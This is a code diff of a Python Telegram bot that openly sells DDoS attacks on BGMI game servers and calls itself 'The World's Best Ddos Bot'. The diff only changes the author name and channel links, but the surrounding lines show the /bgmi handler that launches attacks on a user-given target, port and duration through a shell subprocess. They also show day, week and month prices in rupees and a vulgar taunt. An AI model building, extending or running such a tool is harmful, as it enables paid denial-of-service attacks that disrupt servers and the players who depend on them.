@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#BY TOXIC_HIT
+#BY God_P4P4
 
 import telebot
 import subprocess
@@ -249,9 +249,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}\n😈𝐌𝐀 𝐂𝐇𝐎𝐃 𝐃𝐈 𝐒𝐄𝐑𝐕𝐄𝐑 𝐊𝐈 𝐀𝐁 𝐉𝐀𝐎 𝐏𝐄𝐋𝐎 𝐁𝐀𝐍𝐃𝐎 𝐊𝐎😈"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBY TOXIC_HIT"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBY God_P4P4"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBY TOXIC_HIT"
+        response = "You Are Not Authorized To Use This Command.\nBY God_P4P4"
 
     bot.reply_to(message, response)
 
@@ -289,7 +289,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By @TOXIC_HIT0
+ By @God_P4P40
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -304,7 +304,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nChannel Link https://t.me/+zURSl71EU-c2Yzg1.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @TOXIC_HIT"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nChannel Link https://t.me/+7DhtqIUR_QQ2MDll.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @God_P4P4"
     bot.reply_to(message, response)
 
 
@@ -316,7 +316,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-BY TOXIC_HIT0'''
+BY God_P4P40'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -333,8 +333,8 @@ Pr-ice List:
 Day-->250 Rs
 Week-->900 Rs
 Month-->1600 Rs
-BY TOXIC_HIT
-https://t.me/+zURSl71EU-c2Yzg1
+BY God_P4P4
+https://t.me/+7DhtqIUR_QQ2MDll
 '''
     bot.reply_to(message, response)
 
@@ -349,7 +349,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-BY TOXIC_HIT
+BY God_P4P4
 '''
     bot.reply_to(message, response)
 
